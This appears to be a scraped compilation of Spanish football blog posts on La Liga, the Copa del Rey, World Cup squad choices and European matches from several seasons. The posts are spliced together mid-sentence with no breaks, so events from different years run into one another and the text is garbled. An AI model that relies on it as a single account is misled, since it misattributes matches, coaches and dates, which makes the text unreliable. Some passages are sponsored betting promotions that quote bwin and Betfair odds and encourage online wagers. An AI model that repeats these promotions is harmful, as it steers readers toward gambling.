venía surgiendo en las últimas fechas siempre alrededor de una muy plausible remontada amarilla.Era lo que la lógica imponía. Pero, una vez más, los intangibles del fútbol, esos elementos tan difíciles de percibir, de prever y de diagnosticar por los analistas echaron por tierra todas las previsiones que la razón y el desmenuce táctico habían brindado en la previa de ambos choques de vuelta. No se explica de otro modo el partido serio y comprometido brindado por los de Valverde en feudo espanyolista, como un oasis en el desierto. Algo absolutamente imprevisible e inesperado. Con la convicción de verse en la final que le faltó a buena parte de su hinchada, entre la que me incluyo, el Athletic agrandó su leyenda de equipo copero por excelencia. Demostrando que, muchas veces, el idilio con una competición supera barreras ante las que la euforia y el buen fútbol pueden acabar sucumbiendo. Nadie ha respetado ni venerado tanto el torneo de Copa durante toda su historia como el Athletic Club, alejado por el fútbol de las posiciones de privilegio en los últimos treinta años pero aferrado con misticismo a la magia de un torneo que, de vez en cuando, permite puntuales alegrías irreverentes con el status quo del fútbol moderno. La final era cuestión de justicia poética en una campaña infame. Por encima, por favor, de polémicas estúpidas, de pitadas circenses y de todo aquello que no es fútbol. Nos disponíamos a pasar la tarde del domingo viendo una del Oeste y acabamos, sin saber muy bien cómo, disfrutando de una de Ciencia Ficción, con sus viajes interestelares, sus criaturas imposibles y sus giros de guión absolutamente inesperados. Tras el cada vez menos sorprendente empate del Barça ante el Getafe del sábado, Atlético y Real Madrid jugaban sus bazas en la carrera por el título de Liga en una jornada dominical que acabó siendo de locos.Primero, y cuando aún apurábamos el café de la comida, cayó el Atlético en el Ciutat de València ante el Levante (2-0).No parece que haya mejor modo de comenzar un previo del Athletic-Real Madrid de mañana (18,00 horas, C+ Liga y GolTV) que con esta frase, y precisamente dicha por este futbolista. El contenido de la sentencia está claro: el Athletic es uno de los clubes más antiguos de España, atesora un palmarés envidiable y es uno de los tres eternos de la Primera División, así que la imagen de grandeza clavada en el imaginario de sus aficionados no es ni mucho menos ilegítima. Sin embargo, demasiadas campañas con la gabarra aparcada y bastante mediocridad han ido desterrando esta idea de las nuevas generaciones, por lo que el hincha de San Mamés siempre espera la oportunidad de reivindicar que el Athletic actual es digno de su pasado. Mañana será uno de esos días que cada año ofrece el calendario, cuando el Real Madrid visite la venerable y vetusta Catedral. Cada semana, y de la mano de bwin, os ofreceremos los partidos más interesantes del fútbol mundial, con especial atención a todos aquellos que os manejáis en el mundo de las apuestas on-line. Decíamos que la enjundia de la frase con la que abrimos la entrada no procede sólo de su contenido, sino de su autor. Fernando Llorente es el santo y seña del Athletic actual, quizá el futbolista más llamativo del equipo desde los grandes años de Julen Guerrero, y probablemente el mejor delantero centro español del momento –no incluimos en esa categoría a Villa-. Lleva una temporada espléndida, el coro de voces que pide para él nueve de la roja va creciendo día a día, y también los rumores de marcha para la próxima temporada. Su nombre sonó especialmente como refuerzo del Real Madrid, aunque la resurrección de Benzema en los últimos partidos ha silenciado algo el debate sobre la llegada de arietes a Concha Espina en el próximo ejercicio. Sería interesante verlos frente a frente mañana, pero como Karim no estará, la comparación habrá que hacerla con Adebayor, otro nueve de raza que responde a una tipología parecida al riojano pero que, partido contra los Spurs aparte, resulta bastante menos resolutivo.Dejando un poco a un lado la por otro lado interesante y morbosa comparación de delanteros, encontramos que seguramente el de mañana sea el Athletic-Real Madrid de pronóstico más incierto de los últimos años. El equipo vasco llega con todos sus efectivos disponibles, está firmando un curso modélico que posiblemente le lleve a Europa, tiene en el joven Muniaín –que es duda- a una de las grandes promesas del fútbol español y hace poco metió a tres futbolistas entre los once del equipo nacional, muestra inequívoca de la buena salud del equipo. Y aunque Caparrós no despierta unanimidad en la afición, el balón se ha raseado más este año en San Mamés que en otras campañas, especialmente con el marcador favorable. El quinto puesto no es una casualidad.Enfrente, llega un Madrid que recuerda al de principios de siglo, cuando se aproximaba el final de temporada y el equipo se desdoblaba en Dr. Jekyll europeo y Mr. Hyde liguero. Con la competición doméstica prácticamente perdida y la clasificación para semifinales de Champions en el bolsillo, es muy razonable pensar que Mourinho va a concentrarse en los frentes que, a día de hoy, son más factibles para su equipo. Parece  que reservará a Marcelo y Cristiano Ronaldo, aparte de las seguras ausencias de Khedira y el mencionado Benzema. A priori todo esto parece un gran hándicap para el Madrid, pero a día de hoy, seguramente la única baja realmente relevante sea la del lateral brasileño. Un Cristiano renqueante resta más que suma, Benzema no está completamente recuperado, y de Khedira ya hemos dicho todo lo que había que decir. Con Xabi Alonso a los mandos, Di María –que finalmente no estaba sancionado-, Özil por delante, y Adebayor motivado en un tipo de partido que le va, es difícil pensar que el Madrid no sea competitivo. En cualquier caso, el partido es un must.La victoria del Athletic, que no es ni mucho menos descabellada, sino bastante factible, se paga en bwin a unos jugosos 4,40, el empate a 3,75 y el triunfo madridista a 1,70; el 2,10 a 1-X es muy interesante. Tomando en cuenta que los Athletic-Madrid son partidos que suelen jugarse al ataque y sin hacer prisioneros,hay que tomar en cuenta que dos goles en el primer tiempo se pagan a 2,60, tres o más a 3,90. Un primer gol de Llorente da un rédito de 3,00, mientras que un riesgo interesante podría asumirse a un primer gol de Carvalho, que está pisando área rival esta temporada y que subirá en cada córner, pues se paga a 8.00. Mejor delantero de área Liga BBVA 2011/12View ResultsFernando Llorente. En un año donde varios jugadores del Athletic han ofrecido en el mejor rendimiento de su carrera, se ha alzado sobre todos ellos para proclamar quién es el jugador franquicia en San Mamés y el mejor delantero de España. Incontrolable por su envergadura, goleador, letal por arriba y competente por abajo, ha culminado la obra de Bielsa en los días buenos y ha resuelto muchos de los malos, cuando se hace necesario el talento individual. Sus problemas físicos obligan a preguntarse qué puede dar este jugador a día de hoy en plenitud. Salvo decisión escandalosa o lesión, será titular en Polonia-Ucrania. Karim Benzema. Alguien lo definió como un mediocentro que juega de delantero. Más allá de sus cifras goleadores, muy aceptables, es imposible evaluar el volumen de juego ofensivo que ha generado el Madrid esta temporada gracias a su primer toque, sus paredes, su asistencia y su profundo conocimiento del fútbol. Hace dos años hubiera resultado impensable el consenso actual que genera su titularidad, considerando el competidor que tiene al lado. Un delantero tan peculiar como maravilloso.Radamel Falcao. Para la posteridad quedará su doblete en Bucarest, y muy especialmente el primer gol, en el que instinto, poderío y técnica se combinan para extraer un diamante de la nada. Con Drogba en decadencia, quizá hablamos del nueve puro más decisivo del fútbol mundial, un depredador del área que, además, se mueve a la perfección fuera de ella, y al que además es muy difícil arrebatar el balón. Sus compañeros tardaron en entender su juego, pero el esfuerzo mereció la pena. 33 goles para el Tigre, 23 en Liga.Rubén Castro. Por juego, goles y aportación global, seguramente el mejor fichaje del Betis en este curso. Un trotamundos del fútbol español que, ya en la treintena, se ha tomado el Betis como la última bala de su revólver después de vivir un periplo que le ha llevado por nueve equipos diferentes. En un equipo con más fútbol que gol, ha aportado un toque definitivo de clase que ha llevado bastantes puntos al zurrón de Pepe Mel. Viendo algunos de los quince tantos que ha logrado, uno se pregunta dónde podría haber llegado este jugador de haber gozado de un poco de estabilidad.Arouna Koné. Algunos descubrimos su rubio teñido en Eindhoven y ya no nos olvidamos de él. Otros lo hicieron cuando corría por el Pizjuán, y estarán deseando hacerlo. El periplo indeseable de Sevilla le sirvió para llegar a Levante con la etiqueta de desheredado, tan cara a la concepción actual del club granota, y esta temporada se ha desquitado con un rendimiento sublime. En un equipo que no ha destacado ni por la elaboración ni por la producción ofensiva, ha defendido con fiereza, se ha peleado con todos los centrales, ha corrido hasta el último desmarque, y aún le ha sobrado fuelle para enchufar quince goles fundamentales para llevar a su equipo a Europa. Un héroe entre héroes.Roberto Soldado. El mejor goleador nacional ha explotado esta temporada, en la que por fin ha recuperado el ritmo inhumano de perforar redes que ya mostraba en los tiempos del Castilla. Su juego se basa en tres características: el desmarque, el disparo con la derecha y el cabezazo, y con esos tres avales y una confianza ciega ha devastado a las defensas de la Liga BBVA. Celebró su vuelta a la selección con un hat-trick –penalty fallado incluido- y quizá tenga minutos en la Eurocopa. Si no está en la agenda de los más grandes, el único motivo posible parece la prevención ideológica actual contra los goleadores puros. Otro no hay.Alvaro Negredo. También canterano del Madrid, ninguna casualidad en una Ciudad Deportiva que facturaba arietes al mismo ritmo que en La Masía le ponían el sello a herederos de Guardiola.Si pasan, las semifinales serán terribles. El juego del Madrid no está para exigencias y las individualidades son como los chupitos cortesía de la casa: a veces no vienen y es de mala educación exigirlos.Noventa minutos son muy largos en el Bernabéu. Y luego estará lo del espíritu de Juanito. Y las conjuras y la épica y esas cosas que no dejan de ser disfraces para taparse las vergüenzas, las de un equipo en construcción permanente desde que Florentino Pérez juega al Football Manager en la vida real y hace y deshace sin más criterio que su alocada idea del fútbol y los negocios. Cristiano no fue el primer jugador en ser presentado masivamente en un estadio. Vieja práctica esta de la puesta de largo. Una grada de incondicionales aplaudiendo las pataditas del nuevo jugador, sus controles con el morrillo, y esos besos al escudo tan vitoreados entre los parroquianos. En la imaginación está la posibilidad de que ese nuevo jugador se convierta en esperanza, en futuro, que toque el balón en los partidos con la gracia que lo hace en la presentación. Que su aparición pública de la mano del presidente de turno sea la antesala de una carrera memorable con la nueva elástica. No fue así para el Pato Sosa, la cosa no pudo empezar peor. Tenemos una bonita costumbre en mi familia. Cuando nos juntamos para celebrar cualquier cosa y decidimos brindar en torno a la mesa siempre hay alguien que grita “¡por los ausentes!” antes de chocar las copas. La familia se define por los que están pero también por los que se han ido. Somos de alguna manera el recuerdo de los que ya no nos acompañan. Olvidarlos es sencillo por eso intentamos mantenerlos cerca, cuando las cosas se tuercen pero también, por ser justos, en los momentos de alegría. No es que Benzema o Totti nos hayan abandonado para siempre, larga vida a los futbolistas, pero lo cierto es que ellos serán parte de los ausentes cuando la fiesta del Mundial arranque en Sudáfrica. No estarán, como otros muchos, pero convendremos en que hay faltas y faltas en mayúsculas. Ayer, viendo la lista de seleccionados, el calenturón en Twitter era sonado. Con los que no estarán podríamos ganar el Mundial sin despeinarnos. Entiendo que el oficio de seleccionador es complicado, que no hay licenciatura ni F.P. que aclare los conceptos, que el fútbol es de plastilina y cada cual la moldea como quiere. Pero la lista de ausentes escuece como pelar gambas con un padrastro.Ya hablé alguna vez aquí de los entrenadores iluminados. De esos que caminan sobre las aguas, que ondean la bandera de la independencia, que en su mística futbolística toman decisiones incomprensibles para el aficionado de a pie. Están en su derecho. Domenech, uno de esos técnicos con la almendra mística rodeando su estampa cana, ha decidido prescindir de Benzema. El jugador madridista ha cuajado su peor temporada como profesional. Inadaptado al juego solidario del equipo blanco, con lesiones complicadas y una potencialidad que se ha quedado en pura impotencia.Los de Caparrós, poniendo sobre el tablero las mismas armas que los colchoneros y manejando los mismos códigos sobre el verde que los de Simeone, enredaron al Atleti en una emboscada fundamentada en un juego muy físico, con mucho centrocampismo y un protagonismo absoluto del musculoso trivote dispuesto por el técnico utrerano, con Sissoko, Diop y Simao, criaturas imposibles, plenos de protagonismo. Para cuando el Atleti quiso reaccionar al tempranero gol en propia puerta de Filipe Luís el reloj ya corría más rápido de lo normal. Por fortuna para los granotas, las numerosas llegadas colchoneras de la segunda mitad se encontraron con un de nuevo estelar Keylor Navas. Pocas dudas caben ya acerca de la valía del portero costarricense. Ha traspasado ya ese umbral que le hace pasar de portero revelación a realidad consagrada y confirmada y todo apunta a que el Levante hará caja con él en verano, valiéndose además del escaparate mundialista. El 2-0 final de Orriols dotaba al partido del Santiago Bernabéu, un par de horas después, de un significado especialísimo. El Atleti caía precisamente en el único partido de los tres que le quedaban por disputar hasta el final del campeonato en el que las dudas sobre su éxito eran considerables. El madridismo veía un por fin el rayo de sol abriéndose paso en el nublado horizonte liguero.Pero, para esa hora de la tarde, el argumento de la película que teníamos pensado ver ya había variado considerablemente respecto a nuestras previsiones iniciales. Los indios y el Séptimo de Caballería no sabían ya si dispararse con un Colt del 45 o con una pistola láser. Y así saltó el Real Madrid al césped del Bernabéu, convencido de la importancia de un triunfo ante el Valencia pero al mismo tiempo con la lógica inseguridad del que se enfrente a un escenario inesperado. Ante el caos generado por el imprevisible aunque fuertemente deseado tropiezo rojiblanco, los de Ancelotti se empeñaron en completar una tarde inexplicable, una de esas situaciones que nadie en su sano juicio podría haber previsto apenas unas horas antes. Perder puntos en el Bernabéu ante un rival físicamente diezmado y sumido en la más profunda depresión desde su eliminación europea del pasado jueves era algo bastante impensable. Hacerlo cuando el Atlético había decidido ser más colchonero que nunca en toda la presente temporada y cuando el horizonte parecía abrirse, algo inaudito. Una entre cien. Para cuando Mathieu adelantó a los de Pizzi, al filo del descanso, ya no había rastro de caballos, de balas de paja rodando por el desierto ni de colinas de tierra rojiza. La película era otra completamente diferente.Ni siquiera un estadio tan acostumbrado a tirar de épica en momentos cruciales como el Santiago Bernabéu fue capaz de digerir el buen partido valencianista. La inercia y el peso del Madrid hicieron que la balanza se equilibrara cuando aún quedaba media hora por delante. Quizá fue demasiado pronto, porque esa épica que tan bien maneja el madridismo y que resulta tan efectiva en lapsos breves de tiempo se mostró inútil cuando el Valencia consiguió adelantarse de nuevo con un disparo cruzado de Dani Parejo. Solo una nueva genialidad de Cristiano Ronaldo, ya en tiempo añadido, permitió a los madridistas salir del atolladero con balance positivo con respecto al derrotado líder de la clasificación liguera. Quién nos lo iba a decir a las cinco de la tarde… Tomar el primer café de la semana, el lunes de buena mañana, es un ritual con una liturgia propia. Cortado, largo de café y con poca leche, y la prensa del día sobre la barra. Una rápida ojeada a la generalista y una lectura más tranquila a la deportiva. Cómo ha ido la jornada liguera. Quiénes han sido sus protagonistas. Qué han explicado los entrenadores en las ruedas de prensa. Y, sobre todo, debatirlo y comentarlo con ese confidente que amablemente te sirve el café cada día. Fútbol, solo fútbol. De andar por casa. Asequible para cualquiera.Sergi Roberto. Mira que le habíamos dado palos a Sergi Roberto en el último mes. Que si era un jugador absolutamente intrascendente, que si no tenía sitio en el Barça ni como último suplente del banquillo, que si habían inflado el globo tanto que había terminado por estallar… Pues resulta que el problema del chico era de ubicación en el césped. Que ante la lesión de Dani Alves en San Mamés, Luis Enrique decidió meter al chaval como carrilero diestro (repitiendo una maniobra ya utilizada en algún momento de la pretemporada azulgrana) y obtuvo un rendimiento soberbio. Muy dinámico e incisivo, el canterano se destapó en la primera jornada de Liga como un notable sustituto de Alves. Falta por ver si su meritoria actuación es solo flor de un día o termina por enraizar en el jardín de Lucho.Rubén Castro. La gran esperanza bética se fue de Primera goleando, se mantuvo en Segunda goleando (y contribuyendo con su acierto al ascenso verdiblanco) y retorna a Primera como se esperaba de él, goleando. Su gol, además, tiene ese efecto balsámico de los goles que rescatan puntos cuando ya nadie los espera. Aprovechó, cuando el partido ya sesteaba haca el pitido final, un rechazo de Areola valiéndose simplemente de esa intuición que le hace estar en el sitio oportuno en el momento preciso (revisad su movimiento en la repetición de la jugada, porque es digno de atención). Muchos de los puntos de los de Mel en su regreso a Primera van a llegar de la mano del delantero canario.Roberto Soldado. Dos cursos en White Hart Lane con más sombras que luces habían depreciado al delantero internacional valenciano. Su llegada al Villarreal, para ejercer de principal responsable goleador de los amarillos arrojaba demasiadas dudas. Un gol en el Villamarín marca el camino de su redención y, sobre todo, de su necesaria recuperación anímica. Como él mismo dijo en su presentación, ha venido ‘para volver a ser Soldado‘. Gareth Bale. Esa permanente necesidad de mantener siempre algún debate abierto en torno al Real Madrid tiene hoy como protagonista al centrocampista (nos negamos a considerarle atacante) galés. Su partido en Gijón tuvo tramos notables, particularmente cuando se fijó a la banda izquierda, pero terminó contagiado por la imagen de impotencia de su equipo. Ya hay quien clama por su suplencia cuando solo se ha jugado un partido de Liga. Parece imposible que un jugador de su nivel tenga tantísimas dificultades para asentarse en el equipo. Deja la sensación de que siempre quiere hacer un poquito más, llegar un poco más lejos, aportar más… y eso acaba lastrándole.Antoine Griezmann. ¿Será este el año del salto definitivo del delantero francés? Con la duda de la adaptación de Jackson Martínez, el ‘7’ colchonero arranca la temporada como terminó la anterior: dispuesto a ser la gran referencia atacante del Atlético de Madrid, ofreciendo un completo arsenal de recursos ofensivos para Simeone. Su voracidad en año de Eurocopa francesa puede ser determinante, como ya lo fue el pasado sábado ante la UD Las Palmas. Cientoquince años después de que los miembros de la Asociación Atlética La Gantoise, agrupación lúdico-deportiva creada en Gante en el año 1864, decidiesen atender la sugerencia de un grupo de alumnos de la cercana localidad de Melle y dar su aprobación a la creación del primer equipo de fútbol de la flamenquísima Gante, el KAA Gent (Koninklijke Atletiek Associatie Gent, o Real Asociación Atlética de Gante) ha visto por fin su nombre inscrito entre el de los selectos campeones del campeonato nacional de Bélgica. Más de un siglo después de su constitución y de la disputa de su primer partido oficial, el primer título liguero para el club de Gante llegaba a las vitrinas de la entidad el pasado día veintiuno de mayo, tras derrotar al Standard de Lieja por dos goles a cero en el partido decisivo del playoff por el título. Durante muchos años, el Gent fue para mí poco más que una curiosidad: un club belga con el perfil de un jefe indio en su escudo era la señal evidente de que allí se escondía alguna historia sorprendente.Pero, a estas alturas, nadie duda de que sea un delantero de futuro y sus años pasados en Lyon poco pueden restar a sus virtudes como futbolista. En su lugar el intermitente y nómada Cissé, jugando en la pobre liga griega y un Henry que ha pasado de titular a utillero del Barcelona. Extraña decisión de un cuestionadísimo técnico.Buceando por las listas vemos que Lippi sigue sin darle cancha a Cassano. El polémico delantero es de los pocos jugadores que son capaces de transmitir algo más que disciplina férrea al cuadro azzurro. Su temporada ha sido buena en la Sampdoria y es impensable que un jugador de su talento esté marginado de esa manera. Ni Borriello, ni Iaquinta, ni Rossi pueden aportar la calidad del jugador nacido en Bari. La presencia de Cannavaro o Gattusso dejan a las claras la, por otro lado laureada, semblanza de los italianos.Maradona ha decidido que Gago y Cambiasso no vayan. Extraño lo del primero cuando hace no mucho decía que el ex de Boca era indispensable en la selección albiceleste. Cierto que empezó mal la temporada pero en los últimos meses ha demostrado ser un jugador importante para cualquier equipo. Cambiasso, con una magnifica temporada en el Inter, también se echa de menos. Verón o Bolatti, que van al mediocampo, no tienen nada que envidiar a los descartados. El primero dejó hace tiempo su mejor fútbol y el jugador de la Fiorentina no ha destacado en absoluto este año.A Dunga, encargado de desnaturalizar el perfil ofensivo y vistoso del conjunto brasileño, le ha tocado jubilar a Ronaldinho. También ha prescindido de Adriano, ese delantero que nos maravilló a todos en sus primeros años de Calcio. Pero es que también ha dejado en casa, con las maletas hechas, a Diego y Pato. Dos jugadores polivalentes, de profundidad, con chispa ofensiva y que han sido sustituidos por un irregular Baptista y el veterano Grafite. Viendo a los jugadores elegidos por el exdefensa asumimos ese nuevo Brasil, con mucha rigidez defensiva, con el doble pivote destructor y el balón regalado a un destemplado Kaká, cuya pésima temporada no ha perturbado al seleccionador.Capello y Del Bosque parecen tener aún los pies en la tierra. Sus listas son coherentes con lo andado meses atrás. Tampoco eso es garantía de nada. El tiempo dirá si los que sobran están bien discriminados y los que han ido entre dudas merecían esa confianza. Los Mundiales son terreno aparte.Todo vale en la estrategia de comunicación ultracompetitiva y barullera del club que cuando pierde da la mano. Y no.Y no porque aunque el invento victimista funcione incomprensiblemente de puertas para adentro (para muchos la situación actual es como el chiste del borracho por la autospista, todos conducían en dirección contraria) tanta hostilidad acabará por resultar contraproducente. Enfrascado como está el sector ultra en esta comunión constante con cada una de las tonterías que escupen los tentáculos del calamar comunicativo, un día abrirán la ventana para observar el paisaje y verán que de lo que algún día fue el Madrid no queda casi nada. Por la estrategia. “Puedes cambiar de novia, puedes cambiar de ideas, puedes cambiar de casa, de héroes, puedes cambiar de división, puedes cambiar de amigos, de vida, y puedes cambiar hasta de corazón, pero hay algo de lo nunca podrás cambiar. De camiseta” Con la Real Sociedad por bandera y esta sartenada de lugares comunes nos quería llevar al huerto este verano la Keler, cervecera afincada en San Sebastián que en su tiempo supo hacer caja ofreciéndose como lo más vasco aparecido en el mundo tras el árbol de Gernika. Pero a lo que voy, que me lío. Resulta que los publicistas acertaron de pleno con los muñecos famosos a incluir en el anuncio. Plantaron a dos que precisamente nunca han cambiado de chaqueta. Uno es Xabi Prieto y el otro uno que, como dicen en el país que se inventó esto de la pelotita, es todo un one club man. Un chaval de Azpeitia al que un buen día de 1996 le ofrecieron las llaves de una taquilla en Zubieta y desde entonces nunca ha querido sacarlas de su llavero. Hablo de Mikel Aranburu.Único superviviente de la última gran Real Sociedad, aquella que supo pelearle la liga al Real Madrid hasta el último metro hace unas pocas temporadas, Aranburu cumple su décimotercera campaña consecutiva como fútbolista del primer equipo. Habitual del once donostiarra desde 1999, el que una vez fuera pareja de baile de Xabi Alonso en la medular donostiarra acumula 362 partidos con la blaquiazul. No es poca cosa. Teñida por la sensación de que sin lesiones hubiera sido un jugador aun más importante, Aranburu se ha fabricado una carrera que le coloca justo detrás de las grandes leyendas del club, de motores como Zamora, Arconada, Gorriz, Larrañaga o Loren. Cuando esta noche el Real Madrid regrese a Anoeta y el foco persiga a Xabi Alonso muchos nos fijaremos también en el que está justo al lado, a la sombra, y pensaremos que también es una leyenda. Está visto que ser un poco mendrugo en esto del fútbol es algo que no penaliza. Resulta que el ciudadano Evaeverson Lemos da Silva, conocido para los asuntos de la pelotita y el marketing como Brandao, está siendo investigado en Francia por haber violado supuestamente a una joven de 23 años en una discoteca de la Provenza.Aquí los ídolos sólo despuntan a veces. Se da más el caso del jugador anónimo que de repente se alza como vencedor de un torneo inescrutable. ¿Qué más ausencias os duelen especialmente? ¿Qué hay en la cabeza de los seleccionadores? Chelsea y PSG son equipos vulgares. No hay nada más chabacano que el dinero, nada más ordinario que gastarlo. Ayer vi su eliminatoria de Champions con la mano en la boca para no devolver los Gublins que comía mientras que Ibrahimovic se celebraba a sí mismo y Willian correteaba inútilmente por la banda. Todo es dinero en este deporte del mercadeo y el tráfico de carne. Lo sé. Pero igual que están esos señores mal vestidos que toman café en la barra desapercibidos, con su cuenta del banco creciendo hasta el límite de la inmundicia; los hay que entran al bar con traje nuevo, gafas llamativas, señorona enjoyada del brazo e invitando a los viejos amigos grisáceos que sobreviven acodados entre chicharrones y servilleteros vacíos.El rico puede serlo y parecerlo. Ayer sobre el césped vi dos bloques que rivalizaban en fortuna. De ahí las urgencias. El Chelsea es un nuevo rico pasando por apuros, al que se le ha desmoronado la empresa, que paga mucho y gana poco. El PSG es un nuevo rico que sabe que lo mejor está por llegar. Por fin ha encontrado el técnico el equilibrio adecuado, y la pasta y el talento parecen ir de la mano. Los dos son ejemplos de la cara menos amable del fútbol: la de las inversiones multimillonarias para acelerar los procesos naturales. La evolución propia del balompié: la que hace que Grecia gane Eurocopas y equipos sencillos como el Sevilla sean tetracampeones. Esos momentos que llegan a lomos de la fe y lo improbable, los que convierten esta mierda en una mierda mágica.Ganó con poco el PSG y de nuevo están en cuartos. El Chelsea necesita agua caliente y mucho Fairy. Frotar hasta quitar la grasa. Ni Mourinho, su pata de conejo particular, pudo sacarlos del agujero en el que están. Sobran jugadores y falta mesura. Guus Hiddink transmite ternura con su aire a lo Chicken Little y ese ensimismado gobierno en los márgenes del campo. Temporal, como todo lo bueno, ya tiene sustituto: Antonio Conte. Será el quinto entrenador italiano del equipo azul tras Vialli, Ranieri, Ancelotti y Di Matteo. Ranieri, por cierto, lidera la Premier al frente del Leicester; el Chelsea va décimo.Partidos como el de Hazard, Pedro o Courtois ayer sólo sirven para transmitir malas sensaciones en la gestión de un club con fama –reciente- de talentoso y aguerrido, protagonista de grandísimas noches europeas. Ayer penó sobre el césped de su feudo, ese que fue inexpugnable. Un PSG agarrado a Di María e Ibrahimovic volvió a ganar en la eliminatoria, dejando poco espacio para la defensa de los ingleses. Poca chicha para lo que se preveía, lo normal para la situación de uno de los contendientes.Para los clubes ricos, todo castigo es poco. Me gusta verlos morder el césped. Está en el ser humano, aliarse con los que menos atesoran–porque tener, tienen todos- y esperar a que los más boyantes conozcan la cucharada amarga del jarabe de la derrota. Ayer no quería que ganara ninguno y casi perdieron los dos. El Chelsea fue un rico vulgar, mal conjuntado y con demasiado oro colgándole del pecho. El PSG, queriendo ser más chic, demostró más miedo a  perder que otra cosa tras noventa minutos de pura nadería. Supongo que cuando hablan de una Super Liga Europea se refieren a esto: a ricos gordos presumiendo de reloj en en el apartado de una discoteca de lujo mientras la gente se divierte fuera. Cada semana, y de la mano de Betfair.com, os ofreceremos el análisis de los partidos más interesantes del fútbol europeo, con una especial atención a todos aquellos que os manejáis en el mundo de las apuestas on-line. Esta copa no tiene rey, ni dueño, ni nada que se lo parezca. Por más que intenten los presidentes adueñársela en sus declaraciones previas al choque, por más que tiren de éxitos o retórica, hacía tiempo que no se llegaba a una final tan igualada. Ni sus méritos en la temporada que hoy expira -el acceso a Champions del Sevilla y la flamante Europa League del Atlético de Madrid– los distancia mínimamente. Ninguno ha hecho del buen juego su bandera, ambos han superado un cambio de entrenador en mitad de la temporada, ambos tienen en la Copa del Rey una oportunidad de reivindicarse más allá del aplastante oficio del Barça en el fútbol español. Esta noche, en el Camp Nou, se dirime una competición que ha resurgido en las últimas temporadas. No es aquel trofeo clandestino que atravesó buena parte de esta década. Finales como la del año pasado con un Bilbao derrotado pero exultante, la del Valencia con el ínclito Koeman en el curso más extraño del equipo ché, o aquella levantada por el Sevilla frente al Getafe, con el recuerdo imborrable del equipo azulón echando al Barcelona en semifinales tras una remontada para el recuerdo; revalorizan un torneo hecho a la medida de los humildes y difícil de domar para los grandes. Recuerdo al Alcorcón incluido. Dignísimos finalistas, Sevilla y Atlético disputaran esta noche su inscripción en el palmarés de una Copa que se ha vendido cara esta temporada.Hasta la distribución en el campo es simétrica. Ahora que el Comité de Competición –o un órgano afín, que yo entiendo poco del funcionamiento intestino de nuestro fútbol- ha indultado a Negredo, los dos conjuntos alinearán un once similar. Los cuatro de atrás, un centrocampista de contención y otro con más profundidad ofensiva, dos jugadores puros de banda –con la excepción tal vez de Jurado en sustitución de Simao– y dos delanteros, uno más asociativo y otro con la portería rival entre ceja y ceja. El Atlético tiene varias buenas noticias, una por línea. De Gea ha pasado, en tiempo record, de ser una promesa a una realidad incontestable. Domínguez ha maquillado la catastrófica defensa rojiblanca. Su entrega y solidaridad han mutado a Perea y han permitido a Ufjalusi destacar en el carril diestro. En el centro del campo juega Tiago. Seguro que aportará la claridad que Raúl García no supo darle al equipo en la final europea frente al Fulham, tiene calidad y ganas de quedarse. Por último, en vanguardia, Forlán ha vuelto a ser el goleador impenitente que todos extrañaban. Con unas vigas así Quique tiene fácil levantar la casa. Apartando las dudas a manotazos, el técnico ha sabido convencer a sus hombres de algo obvio: no son tan malos como parecieron a principios del ejercicio.El título continental ha servido para arañarlo en la memoria de los jugadores. La moral no gana partidos, pero ayuda cuando las piernas pesan y el rival aprieta.El Sevilla no lo ha tenido fácil esta temporada. El divorcio entre la afición y Manolo Jiménez desnaturalizó el trabajo de la plantilla. Ningún mérito era suficiente y la eliminación de la Liga de Campeones sepultó el, en mi opinión, magnífico trabajo del mister sevillano. Antonio Álvarez, otro técnico de la casa, se ocupó de un equipo alicaído. A duras penas logró mantener el tipo y un gol milagroso, en el último suspiro, metió al club en el que se ha convertido en objetivo capital para los de Del Nido. Todo pasa por la Champions. En la Copa el equipo de Nervión ha demostrado más capacidad que la enseñada en otras competiciones. Aquella celebrada eliminatoria contra el Barcelona catapultó al equipo. Viendo su presumible once titular no hay dudas de que el Sevilla es pura explosividad sobre el césped. Los extremos son incansables y Negredo y Kanouté se bastan para destrozar la defensa contraria. Zokora se ha destapado como el mejor jugador del Sevilla esta temporada, el más regular, el más necesario en un equipo que basa su fútbol en la transición rápida, en el juego directo. Ahí el marfileño ha marcado diferencias, la ausencia de un mediocentro creativo lo ha multiplicado sobre el rectángulo. Como virtud, en caso de empate, siempre está tener a Palop. Si el partido se decidiera por penaltis, cosa nada arriesgada viendo la igualdad entre ambos conjuntos, el veterano portero ha demostrado ser una auténtica garantía. Pese a su discreto final de temporada con errores que parecían imposibles en un guardameta de su experiencia, ya ha demostrado que se crecer en los partidos importantes.En fin, dos equipos que llegan en paralelo al último partido de la temporada. Igualdad en los planteamientos, igualdad en el estado de ánimo. Con ganas de levantar el trofeo y celebrar, con metal, un momento dulce en sus respectivas historias. Los atléticos redecorando sus vitrinas y los Sevillistas alargando su eclosión como equipo grande de nuestro fútbol. Del tesón de Agüero, la sencillez de Kanouté, la velocidad de Capel, el renacer de Antonio López, la labor sombría pero indispensable de Assunçao o la percusión de Adriano depende que la pelota caiga de un lado u otro de la red. Suerte a ambas aficiones, jugar una final es siempre un motivo para la celebración.En un partido tan igualado como este las cuotas son practicamente idénticas. La victoria del Atletico de Madrid se paga a 2´8 € y la del Sevilla a 2´78 €. Adivinar un resultado parece un buen juego, al menos divertido, como excentricidad el 0-3 se paga a 46 € si estamos muy con el Atleti y 40 € el 3-0 para el Sevilla. los resultados igualados (0-1,1-0,1-2,2-1) rondan los 11 €. Buenos resultados si lo pareja que se presenta la final se confirma sobre el cesped. Hay argumentos para defender a Mourinho. Por más que la prensa muerda la carne, por más que el aficionado se sienta traicionado, hay un puñado de motivos para entender el planteamiento del técnico portugués en el Bernabéu. El punto de arranque es indiscutible: este Real Madrid ha sido incapaz de ganar a su archienemigo jugando con sus mismas armas. Era hora de que el técnico mejor pagado del mundo justificara su fama de estratega y propusiera un once que debilitara el boyante planteamiento blaugrana, una trama que entorpeciera el juego directo y ganador de los hombres de Guardiola.Por ahí iban los tiros. Con Lass y Pepe en el mediocampo y una pareja de laterales que pretendían, muy a priori, aprovechar las recuperaciones del mediocampo y atenazar, muy a priori, las subidas de Alves y Abidal.Este último marcó un gol, añado como resumen del éxito del dibujo táctico. Arriba tres satélites intimidantes, Benzema, Higuaín y Cristiano Ronaldo, más pendientes de imposibilitar la salida limpia del balón que de elaborar juego. Su misión era, como en una suerte de Humor Amarillo, correr detrás de los balones disparados por los cañones de Navarone de la retaguardia. Me niego a juzgar a Mourinho con base en la estética. Es un argumento tan laxo, tan alejado de la esencia futbolística, que he tenido que quitar la radio esta mañana. Si asumimos que el fútbol es un negocio, no podemos entender que la belleza supere las 